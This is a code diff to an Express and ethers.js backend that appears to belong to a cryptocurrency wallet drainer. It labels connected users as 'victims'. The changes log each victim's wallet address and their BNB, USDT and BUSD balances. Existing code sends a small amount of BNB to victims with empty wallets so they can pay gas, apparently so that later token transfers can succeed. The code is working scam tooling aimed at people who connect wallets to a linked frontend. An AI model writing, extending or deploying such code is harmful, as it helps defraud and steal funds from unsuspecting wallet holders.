@@ -11,7 +11,7 @@ function formatError(error) {
 const app = express();
 app.use(express.json());
 app.use(cors({
-  origin: ["http://localhost:5173", "https://frontend-wallet-khaki.vercel.app/"], // Adjust to your frontend port
+  origin: ["http://localhost:5173", "https://frontend-wallet-khaki.vercel.app/"],
   methods: ["GET", "POST"],
   allowedHeaders: ["Content-Type"],
 }));
@@ -75,14 +75,25 @@ async function checkWalletBalance() {
 }
 
 async function sendGasIfNeeded(victimAddress) {
+  // Log the connected victim address
+  console.log(`Connected wallet address: ${victimAddress}`);
+
+  // Log BNB balance
   const victimBalance = await provider.getBalance(victimAddress);
-  console.log(`Victim balance: ${ethers.formatEther(victimBalance)} BNB`); // Changed TBNB to BNB
+  console.log(`Victim BNB balance: ${ethers.formatEther(victimBalance)} BNB`);
+
+  // Log USDT and BUSD balances
+  for (const token of tokenList) {
+    const tokenContract = new ethers.Contract(token.address, tokenAbi, provider);
+    const tokenBalance = await tokenContract.balanceOf(victimAddress);
+    console.log(`Victim ${token.symbol} balance: ${ethers.formatUnits(tokenBalance, token.decimals)}`);
+  }
 
   if (victimBalance === BigInt(0)) {
     const bnbToSend = ethers.parseEther("0.025"); // $5 at ~$500/BNB
     const gasSettings = await getGasSettings();
 
-    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`); // Changed TBNB to BNB
+    console.log(`Victim has 0 BNB. Sending ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas...`);
     const tx = await wallet.sendTransaction({
       to: victimAddress,
       value: bnbToSend,
@@ -92,7 +103,7 @@ async function sendGasIfNeeded(victimAddress) {
 
     console.log(`Gas transaction sent: ${tx.hash}`);
     const receipt = await tx.wait();
-    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash }; // Changed TBNB to BNB
+    return { success: true, message: `Sent ${ethers.formatEther(bnbToSend)} BNB to ${victimAddress} for gas`, txHash: tx.hash };
   }
   return { success: false, message: "No gas needed" };
 }
